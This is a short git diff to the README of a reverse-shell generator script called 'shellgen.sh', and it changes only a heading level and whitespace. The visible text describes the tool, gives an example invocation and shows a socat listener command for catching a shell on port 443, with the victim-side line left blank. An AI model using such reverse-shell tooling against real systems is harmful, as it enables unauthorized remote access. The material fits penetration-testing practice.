@@ -9,7 +9,7 @@ Takes the name of a binary, an interface, and a port as input and returns revers
 If no interface or port number is supplied, the defaults are tun0 for interface and port 443.
 
 
-# Examples
+## Examples
 
 ```
 ./shellgen.sh -s php -i tun0 -p 4444
@@ -35,7 +35,8 @@ Reverse TCP:
 Listener:
                                                          
                                                                                                                                                                                                                                              
-        socat file:/dev/pts/0,raw,echo=0 tcp-listen:443                                                                                                                                                                          
+        socat file:/dev/pts/0,raw,echo=0 tcp-listen:443                                                                                                                     
+        
                                                                                                                                                                                                                                              
 Victim:                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
